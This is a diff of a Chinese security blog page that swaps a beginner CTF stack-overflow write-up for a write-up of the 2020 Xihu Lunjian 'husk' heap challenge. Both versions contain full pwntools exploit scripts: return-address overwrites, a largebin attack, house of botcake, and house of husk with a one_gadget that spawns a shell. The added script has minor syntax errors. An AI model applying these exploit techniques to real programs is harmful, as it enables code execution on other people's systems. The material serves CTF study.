@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>2019-NEX招新赛-writeup-PWN | t1an5t&#39;s Treasure</title>
-  <meta name="keywords" content=" pwnable , ctf ">
-  <meta name="description" content="2019-NEX招新赛-writeup-PWN | t1an5t&#39;s Treasure">
+  <title>2020-西湖论剑-final-husk | t1an5t&#39;s Treasure</title>
+  <meta name="keywords" content=" pwnable ">
+  <meta name="description" content="2020-西湖论剑-final-husk | t1an5t&#39;s Treasure">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="初步分析资料[1]里面有下载链接。 在我的1604下直接用run.sh就跑起来了，没有用户名密码了，qemu起来就是root权限。怪不得给了个内核镜像，打开是一个小型文件系统。 还是先看run.sh： ./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-">
 <meta name="keywords" content="pwnable,qemu">
@@ -459,9 +459,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-2019-NEX招新赛-writeup-PWN" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-2020-西湖论剑-final-husk" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">2019-NEX招新赛-writeup-PWN</h1>
+        <h1 class="article-title">2020-西湖论剑-final-husk</h1>
     
     <div class="article-meta">
         
@@ -469,7 +469,7 @@
         
         <span class="book">
             
-                <a  data-rel="CTF">CTF</a>
+                <a  data-rel="PWN">PWN</a>
             
         </span>
         
@@ -478,14 +478,12 @@
             
             <a class="color3">pwnable</a>
             
-            <a class="color4">ctf</a>
-            
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-02-29 22:00:46'>2019-10-27 21:52</time>
+        创建时间:<time class="date" title='更新时间: 2020-11-15 14:08:34'>2020-11-14 23:01</time>
         
     </div>
     <div class="article-meta">
@@ -507,7 +505,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基础"><span class="toc-text">基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn01-checkin"><span class="toc-text">pwn01_checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn02-overflowme"><span class="toc-text">pwn02_overflowme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn03-do-you-know-PIE"><span class="toc-text">pwn03_do_you_know_PIE</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -523,197 +521,171 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>所有pwn题目的源代码都开源在了：<a href="https://github.com/NEU-NEX/NEXCTF2019" target="_blank" rel="noopener">https://github.com/NEU-NEX/NEXCTF2019</a></p>
-<p>本次招新赛我为萌新准备了四道相当基础的入门题目，好像只放出了三道，有一道运维忘记放了hhh。剩下放出的题目虽然也是基础题，但对于萌新应该不太友好的，要是能都做上基本已经是很不错的水平了。</p>
-<p>&nbsp;</p>
-<a id="more"></a>
-<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>需要掌握的基础其实说起来也并不多，首先就是搞个虚拟机，里面安个ubuntu（最好是1604），大概知道怎么用就可以。其次就是会python，如果你学过任何其他语言，那么python学起来真的是非常快。然后就是C语言和汇编，起码要能看懂他们在干什么。</p>
-<p>&nbsp;</p>
-<h2 id="pwn01-checkin"><a href="#pwn01-checkin" class="headerlink" title="pwn01_checkin"></a>pwn01_checkin</h2><p>首先丢到IDA里，定位到main函数，一般来说左边这一串就是可以找到main函数的：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572175200901.png" alt="1572175200901"></p>
-<p>然后点进去，F5大法看到IDA给我们生成的伪C代码，得到：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572175241566.png" alt="1572175241566"></p>
-<p><code>puts</code>是库函数，我们不用去考虑它，重点还是<strong>关注由用户所编写的函数</strong>，先打开<code>init</code>：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572175347034.png" alt="1572175347034"></p>
-<p>大多数题目的<code>init</code>函数都是这么写的，其实只是对IO流的缓冲区做了一些处理，是为了在堆上不产生额外的堆块，不用去在意。</p>
-<p>然后去看<code>vuln</code>函数，如其名称一样，应该存在漏洞：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572175559665.png" alt="1572175559665"></p>
-<p>看不懂的地方先忽略，先关注整个程序流程，很简单，给三个变量赋值为1，然后让用户向buf里面读入0x30个字符，之后比较三个变量的和是否为666，是则触发后门得到shell。</p>
-<p>乍一看就是一个普通的程序，但是这里是存在很严重的问题。问题发生在向buf读入0x30个字符这里，buf在内存里是一大段连续的内存，但是<strong>如果buf这段内存的长度本身小于0x30，但是我们却读入了0x30个字符</strong>，那么会发生什么呢？</p>
-<p>所以首先需要考虑一个问题：</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>你们去杭州打西湖论剑，我在宿舍捡题做，我们都有光明的未来。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题目还是很有意思的，有很多值得总结的地方。题目环境2.30，我在<strong>本地2.31</strong>的环境下完成。</p>
+<p>首先程序标准的菜单堆，但是只能分配0x420-0x600之间的堆块，free未置NULL，有很明显的UAF。</p>
+<p>但是还有一个相对隐蔽的漏洞，那就是add的时候是先分配堆块，之后再检测并分配全局变量，<strong>所以即使已经满了，还是可以分配堆块并写入内容</strong>，这里我一开始没有观察到，所以最后对堆布局的时候尝试了很极限的操作并且失败了，耽误了很多时间。</p>
+<p>只能分配超过tcache和fastbin的堆块，明显的UAF，题目名字还叫husk，所以很容易想到是<code>house of husk</code>。</p>
+<p>这里不详细展开讲<code>house of husk</code>的细节，反正看着poc能手搓出来就行了。</p>
+<p>原理：<a href="https://maxwelldulin.com/BlogPost?post=3107454976" target="_blank" rel="noopener">https://maxwelldulin.com/BlogPost?post=3107454976</a></p>
+<p>POC：<a href="https://github.com/ptr-yudai/House-of-Husk/blob/master/poc-husk.c" target="_blank" rel="noopener">https://github.com/ptr-yudai/House-of-Husk/blob/master/poc-husk.c</a></p>
+<p>概括来说就是：</p>
 <ul>
-<li><p>问：buf这个变量有多长我是这怎么知道的？</p>
-</li>
-<li><p>答：我的习惯是看rbp指针：</p>
-<p>  <img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572176002336.png" alt="1572176002336"></p>
-<p>  rbp称为栈基指针，指向栈空间底部，这些rbp的含义是在告诉你这些内存中连续的变量和rbp当前值的偏移值，所以buf的长度可以这么计算：</p>
-<blockquote>
-<p>0x30 - 0xc = 0x24</p>
-</blockquote>
-</li>
+<li>通过修改<code>global_fast_max</code>来让<code>fastbin</code>的范围变大，这现在也是个常规技巧了</li>
+<li>讲2个经计算得到指定size的chunk给free，这时它们会被当成fastbin进而放入到我们想要的位置。这里需要把两个chunk给free到<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>的位置。</li>
+<li>把<code>__printf_arginfo_table</code>理解成是<code>printf</code>针对不同参数如<code>%s/%p</code>等的对应的<code>vtable</code>，触发条件就是<code>__printf_function_table != NULL</code>，这样改掉里面的函数指针，就可以劫持<code>RIP</code>了。</li>
 </ul>
-<p>所以再回到之前的问题上，如果向buf读入了0x30个字符会发生什么问题呢，答案就是<strong>会覆盖掉它下面的值，比如v2,v3,v4的数值。</strong>知道了这一步，那么我们就有机会改掉他们的数值，让其和等于666来触发后门。</p>
-<p>所以可以构造这么一个字符串，填满buf，然后把v2覆盖成664就可以达成条件了。</p>
-<p>那么就需要用到我们的神器–pwntools，这是一系列的工具以及python的一个库，目前对Ubuntu1604+python2.7.x是支持最好的</p>
-<p>现在linux下一条命令即可下载：</p>
-<pre><code>pip install pwntools</code></pre><p>一个简单的模板如下：</p>
-<pre><code class="python">from pwn import *                            # 导入pwn库
-context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)        # 一些配置，32位-i386，64位-amd64，可不加
-context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]  # 设置终端类型，可以不加   
-context.log_level = &quot;debug&quot;                  # 加了这个可以清晰地显示中间的IO过程
-
-p = process(&quot;./pwn&quot;)                         # 本地运行某程序进行交互，程序路径写在括号中
-# p = remote(ip, port)                       # 远程交互，ip地址是字符串，port是数字
-
-# ...
-# some exploite code
-# ...
-
-p.interactive()                              # 程序没运行完，可以手动交互，必须有这句
-</code></pre>
-<p>关于pwntools的一些IO交互的代码很简单，自行百度就行了，这里只说一下<code>send()</code>和<code>sendline()</code>的区别：</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>原poc在2.27环境下，此时的unsortedbin解链检测还不算严格，所以可以用unsortedbin attack来实现。而且malloc的size很自由，自然也就不用chunk overlap了。</p>
+<p><strong>不过这里是2.30/2.31</strong>，且size分配没那么自由(不然我直接分配到<code>__free_hook</code>再分两次取出来不就行了么…)，所以最后的做法是<code>largebin atatck</code>修改掉<code>global_fast_max</code>，之后用大概<code>house of botcake</code>的手法去造成<code>unsortedbin</code>上的<code>chunk overlap</code>，这样就可以得到指定size的chunk了。经过计算这两个size分别是<code>0xa8e0</code>和<code>0xaf90</code>，所以再怎么极限构造，也是无法让<code>free</code>时的<code>next chunk</code>的检测合法的，这个时候就用到了开始我提到的，可以无限分配，虽然拿不到指针，但是能随便写东西也不会被<code>free</code>的事情了，有了它这件事情就完美解决了。</p>
+<p>之后按照<code>house of husk</code>的流程来走就行了，两个chunk就会被分配到<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>的位置。</p>
+<p>然后因为我也把握不好<code>printf</code>到底会调用其中的哪个参数，所以索性我就把<code>__printf_arginfo_table</code>表中的函数指针全部覆盖成<code>one_gadget</code>了，暴力就完事了。</p>
+<p>所以这道题是<code>largebin attack</code> + <code>house of botcake</code> + <code>house of husk</code>这么一套组合拳来完成的。不过理清了上面的内容，整个利用历程还是非常清晰的，exp里我也加入了每个步骤的注释。</p>
+<p>最后，这里<code>one_gadget</code>的选取也是一个很重要的点，因为<code>one_gadget</code>工具搜<code>2.31</code>的libc时候，没什么好的<code>one_gadget</code>地址，条件看起来都是这样的：</p>
+<p><img src="2020-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-final-husk/image-20201114231352036.png" alt="image-20201114231352036"></p>
+<p>我们之前版本的libc搜<code>one_gadget</code>的地址，条件基本都是栈空间某位置是NULL，很明显栈的条件会更容易达成一些。所以这个时候不用慌，把<code>libc</code>拖进IDA里面，翻一翻执行<code>execve(&quot;/bin/sh&quot;, ..., ...)</code>的地方，看看它们周围的代码，没准就会有意外收获。比如这里就看到上面的那个条件通过反向追踪执行流，我们就找到了满足栈条件的地方了。再一尝试就果然成功了。</p>
+<p><img src="2020-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-final-husk/image-20201114231322268.png" alt="image-20201114231322268"></p>
+<p>所以最后的exp：</p>
 <pre><code class="python">from pwn import *
-
-p = process(&quot;./pwn&quot;)
-
-p.send(&quot;aaa&quot;)      # 写的是什么字符串，发的就是什么字符串。
-
-p.sendline(&quot;aaa&quot;)  # 会在末尾补上&quot;\n&quot;再发送，相当于替你敲了一下回车，等于 p.send(&quot;aaa\n&quot;)
-
-p.interactive()</code></pre>
-<p>一般来说推荐使用<code>send()</code>，因为对pwn这种精工细活来说，每一个字节都十分重要，失之毫厘差之千里。</p>
-<p>这里还有个问题，把buf填充满很简单，写0x24个字符a就可以了，但是怎么把v2覆盖成664？因为按照之前的计算长度方式，v2长度是四个字节。</p>
-<p>计算机是按照<strong>小端序</strong>的结构存储数据的，具体可以自行了解，简单来说就是你理解的数据和计算机理解的数据长得不一样。</p>
-<p>很明显我们要覆盖一个<strong>四字节</strong>的数据，让其被计算机理解为666，<strong>也就是0x0000029a</strong>，用到上面的小端序，实际上我们要输入的字符是<strong>“\x9a\x02\x00\x00”</strong>，这样确实可以，不过每次这么算也确实不太方便，一不小心还容易弄错顺序，所以pwntools帮我们封装好了一组函数：<strong>p32(),p64(),u32(),p64()…</strong>用来将这样的数据相互转换，<strong>p是pack，打包，将数字转化成小端序字符串；u是unpack，解包，将小端序字符串转化成数字</strong>。</p>
-<p>&nbsp;</p>
-<p>所以就可以写出第一个pwn的exp了：</p>
-<pre><code class="python">from pwn import *
-context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)
-context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
-context.log_level = &quot;debug&quot;
-
-# p = process(&quot;./pwn&quot;)
-p = remote(&quot;handsomedog.top&quot;, 9001)
-
-payload = &quot;a&quot; * 0x24 + p32(664)
-
-p.recv()
-p.send(payload)
-
-p.interactive()</code></pre>
-<p>本地运行拿到shell：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572178490824.png" alt="1572178490824"></p>
-<p>远程运行也成功：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572178611753.png" alt="1572178611753"></p>
-<p>&nbsp;</p>
-<h2 id="pwn02-overflowme"><a href="#pwn02-overflowme" class="headerlink" title="pwn02_overflowme"></a>pwn02_overflowme</h2><p>依然IDA F5大法，其他长得都一样，看vuln：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572178915409.png" alt="1572178915409"></p>
-<p>嗯，没了。</p>
-<p>还是用上面介绍的方法，可以看出buf长度0x20，但是read可以读入0x100的字节。很容易想到还是输入超过0x20长度的字符，然后覆盖一些东西。这次看不到其他变量可以被覆盖了，我们覆盖的是什么呢？</p>
-<p><strong>这里用到的知识点叫做栈帧（stack frame）</strong></p>
-<p>考虑这么一件事，刚才那个read是在vuln()函数里的，那么我<strong>执行vuln()函数之后还要回到main()函数里去执行下一行</strong>。</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572179252871.png" alt="1572179252871"></p>
-<p>所以程序在进入vuln()函数前一定要做的一件事情就是<strong>要记录那个“下一行”的地址</strong>，因为它执行完vuln()的内容后还要回来。<strong>这其实就是用一些指令构造并控制栈帧这个结构来实现的</strong></p>
-<p>涉及到的关键指令：<strong>call, leave, ret</strong>，指针：<strong>sp, bp</strong></p>
-<p>关于栈帧网上资料很多，请自行查阅，理解之后再继续阅读。</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>###############################################################</p>
-<p>&nbsp;</p>
-<p>&nbsp;</p>
-<p>所以这回就知道了，<strong>buf下面虽然看起来没有变量了，但是栈里面实际上存的依次为buf，rbp指针，ip指针</strong></p>
-<p>切换到IDA的汇编窗口看一下，ip存的应该是这个：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572180018548.png" alt="1572180018548"></p>
-<p>我们可以用gdb来查验一下（gdb是linux下的动态调试器，初次接触可能会觉得很反人类，不过确实是个神器）</p>
-<p>命令行中用gdb启动pwn2程序：</p>
-<pre><code>gdb ./pwn2</code></pre><p>IDA里看一下read一结束后的地址：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572180229624.png" alt="1572180229624"></p>
-<p>gdb里下断点：</p>
-<pre><code>b *0x4006ea</code></pre><p>然后gdb里输入r来运行程序，随便输入点什么：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572180347956.png" alt="1572180347956"></p>
-<p>回车后发现程序断在了这里：</p>
-<p><img src="2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572180378962.png" alt="1572180378962"></p>
-<p>查看一下buf的位置，和rbp的值：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572180479536.png" alt="1572180479536"></p>
-<p>可以看到栈空间中，和栈帧描述以及我们之前的预测是一致的：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572180556328.png" alt="1572180556328"></p>
-<p>所以我们通过buf是可以覆盖到rbp以及ip指针的，<strong>那么当执行ret指令的时候，原本是0x400761被传给rip变成了我们可以传递任意值给rip，也就达到了控制程序流程到任意地址的目的</strong></p>
-<p>程序里存在后门函数，直接让程序运行到后门函数那里就可以了，后门函数的起始地址：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572180706224.png" alt="1572180706224"></p>
-<p>&nbsp;</p>
-<p>运用第一题提到的小端序和p64()函数就可以写出第二题的exp<strong>（用p64()是因为64位程序的地址和指针都是8字节的，上一题用p32()是因为被覆盖的变量是4字节长，和32位地址和指针的长度一致）</strong>。</p>
-<pre><code class="python">from pwn import *
-context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)
-context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.arch == &quot;amd64&quot;
+context.terminal = [&quot;tmux&quot;, &#39;splitw&#39;, &#39;-h&#39;]
 #context.log_level = &quot;debug&quot;
 
-#p = process(&quot;./pwn2&quot;)
-p = remote(&quot;handsomedog.top&quot;, 9002)
+p = process(&quot;./husk&quot;))
+base = p.libs()[p._cwd+p.argv[0].strip(&#39;.&#39;)]
 
-payload = &quot;a&quot; * 0x20        # 填满buf
-payload += p64(0xdeadbeef)  # 别忘了ip指针之前还有个rbp需要覆盖，覆盖成任何值都可以
-payload += p64(0x4006b6)    # backdoor函数的起始地址
+libc = ELF(&quot;./libc.so.6&quot;)
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a, b)
 
-p.recv()
-p.send(payload)
+def debug(cmd=&quot;&quot;):
+    gdb.attach(p, cmd)
+
+def choose(idx):
+    sla(&quot;&gt;&gt;&quot;, str(idx))
+
+def add(sz, ctx):
+    choose(1)
+    sla(&quot;Size:\n&quot;, str(sz))
+    sa(&quot;Content:\n&quot;, ctx)
+
+def free(idx):
+    choose(2)
+    sla(&quot;Index:\n&quot;, str(idx))
+
+def show(idx):
+    choose(3)
+    sla(&quot;Index:\n&quot;, str(idx))
+
+def edit(idx, ctx):
+    choose(4)
+    sla(&quot;Index:\n&quot;, str(idx))
+    sa(&quot;Content:\n&quot;, ctx)
+
+def offset2size(ofs):
+    return ofs * 2 - 0x10
+
+cmd = &quot;set $a=%d\n&quot; %(base+0x202040)
+#debug(cmd)
+
+MAIN_ARENA = 0x1ebb80
+PRINTF_FUNCTABLE = 0x1f0ff8
+PRINTF_ARGINFO = 0x1f1350
+GLOBAL_MAX_FAST = 0x1eeb80
+FREE_HOOK = 0x1eeb28
+
+# largebin attack
+add(0x5d8, &quot;aa&quot;) # 0
+add(0x440, &quot;aa&quot;) # padding
+add(0x5e8, &quot;aa&quot;) # 2
+add(0x440, &quot;aa&quot;) # padding
+add(0x5c8, &quot;aa&quot;) # 4
+
+# chunk overlap init layout
+add(0x600, &quot;a&quot;) # 5
+add(0x600, &quot;a&quot;) # 6
+add(0x600, &quot;a&quot;) # 7
+add(0x600, &quot;a&quot;) # 8
+add(0x440, &quot;a&quot;) # padding
+
+# merge chunk into unsortedbin
+free(5)
+free(6)
+free(7)
+free(8)
+
+# chunk overlap
+add(0x430, &quot;a&quot;) # 10 
+add(0x430, &quot;a&quot;) # 11 5 overlap 11
+add(0x430, &quot;a&quot;) # 12 6 overlap 12
+add(0x5b0, &quot;a&quot;)
+add(0x5b0, &quot;a&quot;)
+
+# make fake chunk&#39;s nextchunk valid
+for i in range(0x30):
+    add(0x600, p64(0x21)*0xc0)
+
+success(hex(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA)))
+success(hex(offset2size(PRINTF_ARGINFO - MAIN_ARENA)))
+
+# free into largebin
+free(0)
+free(2)
+add(0x600, &quot;aa&quot;)
+
+# leak heap
+show(2)
+ru(&quot;: &quot;)
+heap = u64(rv(6).ljust(8, &quot;\x00&quot;))-0x290
+success(&quot;heap: &quot;+hex(heap))
+
+# leak libc
+add(0x5e8, &quot;aa&quot;) 
+show(0)
+leak = u64(ru(&quot;\x7f&quot;)[-6:].ljust(8, &quot;\x00&quot;))
+libc_base = leak-0x1ebfe0-0x60
+success(hex(leak))
+success(&quot;libc base: &quot;+hex(libc_base))
+
+free(4)
+
+#*(uint64_t*)(p1+0x18) = (uint64_t)(&amp;victim)-0x20
+# overwrite largebin&#39;s bk_nextsize
+payload = p64(leak)*2+p64(heap+0x290)+p64(libc_base+GLOBAL_MAX_FAST-0x20)
+edit(0, payload)
+
+# largebin attack
+add(0x420, &quot;attack&quot;) 
+
+# use chunk overlap
+
+# free into __printf_function_table
+payload = &quot;\x00&quot;*0x438+p64(0xaf90+0x11)
+edit(5, payload)
+free(11)
+
+# free into __printf_arginfo_table
+payload = &quot;\x00&quot;*0x268+p64(0xa8e0+0x11)
+edit(6, payload)
+free(12)
+
+# one gadget
+one = libc_base+0xE6ED8 
+payload = p64(one)*0x80
+edit(12, payload)
+
+# get shell
+choose(5)
+sla(&quot;:\n&quot;, &quot;ttt&quot;)
 
 p.interactive()</code></pre>
-<p>远端效果：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572181008846.png" alt="1572181008846"></p>
-<p>&nbsp;</p>
-<h2 id="pwn03-do-you-know-PIE"><a href="#pwn03-do-you-know-PIE" class="headerlink" title="pwn03_do_you_know_PIE"></a>pwn03_do_you_know_PIE</h2><p>还是和前面一样的操作，F5大法之后乍一看和pwn2没区别？但是发现原来的exp怎么打也打不通了。</p>
-<p>再仔细看看汇编窗口的东西，pwn2是这样的：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572180018548.png" alt="1572180018548"></p>
-<p>pwn3是这样的：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572181528850.png" alt="1572181528850"></p>
-<p>区别在于pwn2是0x400xxx这样的地址，而pwn3变成了0x000xxx这样的地址。</p>
-<p>这里其实是因为<strong>程序在编译的时候开启了PIE保护，可以用pwntools带的checksec工具查看</strong>：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572181798790.png" alt="1572181798790"></p>
-<p>有兴趣的可以去了解一下PIE的实现原理以及更细节的东西。</p>
-<p>简单来说，没有开启PIE的程序，32位程序的地址都是0x8048xxx这样的地址，64位程序都是0x400xxx这样的地址，这样程序里任何函数，指令的地址永远是固定的，就像pwn2那样。而开启了PIE的程序pwn3，在IDA里可以看到它是从0开始的，相当于一个偏移地址，在运行起来的时候，程序会被动态地赋予一个具有一定随机化的加载基值<strong>（这个基地址后12bit一定是0，因为加的是页偏移）</strong>，然后再加上偏移地址才是运行地址。</p>
-<p>可以gdb里看一下pwn2和pwn3的基地址的不同：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572182436773.png" alt="1572182436773"></p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572182460813.png" alt="1572182460813"></p>
-<p>所以重新思考一下我们应该覆盖的值：</p>
-<p>我们还是在read一结束的时候下断点，先看一下偏移值：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572182651474.png" alt="1572182651474"></p>
-<p>然后在gdb下断点：</p>
-<pre><code>b *(0x0000555555554000+0x936)</code></pre><p>同样的运行并随便输入数据：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572182716206.png" alt="1572182716206"></p>
-<p>停止后的栈情况：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572182777854.png" alt="1572182777854"></p>
-<p>可以看到，其他的看起来是差不多的。但是这个ip指针的值该覆盖成什么，我们不知道了。<strong>但是我们是可以从IDA里知道各个函数的偏移值的。</strong></p>
-<p>backdoor的偏移值：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572183021319.png" alt="1572183021319"></p>
-<p>所以如果我们能把第三个箭头这个0x5555555549af 改成0x555555554900，那还是可以去执行backdoor的。<strong>认真一点可能会发现，这两个地址只有低8bit是不一样的，所以如果能改掉这最后8bit，也就是一个字节，那么就达到了目的。</strong></p>
-<p><strong>这里又要用到小端序这一点了</strong>，这里的地址8字节全部展开是这样的：</p>
-<pre><code>0x00005555555549af</code></pre><p>展开成字符串是这样的”\xaf\x49\x55\x55\x55\x55\x00\x00”。</p>
-<p>所以这里用到的技巧就是<strong>patial overwrite</strong>，就是局部写，只需要通过局部的覆盖把”\xaf”覆盖成”\x00”，</p>
-<p>那么程序里解析就会把0x5555555549af 改成0x555555554900，跳到backdoor。</p>
-<p>（其实一般情况下需要覆盖两个字节，这时需要爆破一个字节，成功率1/16。不过这道题我降低了难度只需要覆盖一字节即可完成）</p>
-<p>&nbsp;</p>
-<p>根据上面所说即可编写exp：</p>
-<pre><code class="python">from pwn import *
-context(arch = &#39;amd64&#39;, os = &#39;linux&#39;)
-context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
-#context.log_level = &quot;debug&quot;
-
-#p = process(&quot;./pwn2&quot;)
-p = remote(&quot;handsomedog.top&quot;, 9003)
-
-payload = &quot;a&quot; * 0x20        # 填满buf
-payload += p64(0xdeadbeef)  # 别忘了ip指针之前还有个rbp需要覆盖，覆盖成任何值都可以
-payload += &quot;\x00&quot;           # 通过patial overwrite改成backdoor函数的偏移地址
-
-p.recv()
-p.send(payload)
-
-p.interactive()
-</code></pre>
-<p>远端效果：</p>
-<p><img src="/2019-NEX%E6%8B%9B%E6%96%B0%E8%B5%9B-writeup-PWN/1572183525405.png" alt="1572183525405"></p>
-<p>&nbsp;</p>
-<p>先不写了，之后更新看心情了。-.-</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>exp中可以看到，我这个布局在泄漏&amp;攻击之前就全部完成了，看起来很简洁，实际上都是踩了不少坑，然后一步一步反向推导出来的。因为<code>largebin attack</code>以后<code>main_arena</code>就被破坏了，我又懒得去修完再继续搞，显得很冗余。</p>
+<p>脑子里时刻装着一个ptmalloc对于做堆布局题目来说是十分重要的，比如这里想<code>largebin attack</code>就需要写到<code>bk_nextsize</code>，那么就需要泄漏heap和libc，所以就想到让两个chunk在largebin中成链，这样泄漏的就是heap，之后再从largebin里取出一个然后再泄漏，这样就是libc了。</p>
+<p>这道题算是给了我一个新板子吧。可以R&amp;W的<code>UAF</code>，在size既不能太小(超过tcache的限制)，也不能太大(不能任意size去free到<code>__free_hook</code>的程度)的条件下，通过构造<code>largebin attack</code> + <code>house of botcake</code> + <code>house of husk</code>的组合拳就可以来控制<code>RIP</code>。个人感觉算是一种<code>global_max_fast attack</code>的一种船新玩法。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1037178204@qq.com </span>
@@ -723,12 +695,12 @@ p.interactive()
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>2019-NEX招新赛-writeup-PWN</p>
+    <p><span class="copy-title">文章标题:</span>2020-西湖论剑-final-husk</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="t1an5t">t1an5t</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-27, 21:52:33</p>
-    <p><span class="copy-title">最后更新:</span>2020-02-29, 22:00:46</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019-NEX招新赛-writeup-PWN/" title="2019-NEX招新赛-writeup-PWN">http://tianstcht.github.io/2019-NEX招新赛-writeup-PWN/</a>
+    <p><span class="copy-title">发布时间:</span>2020-11-14, 23:01:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-11-15, 14:08:34</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020-西湖论剑-final-husk/" title="2020-西湖论剑-final-husk">http://tianstcht.github.io/2020-西湖论剑-final-husk/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
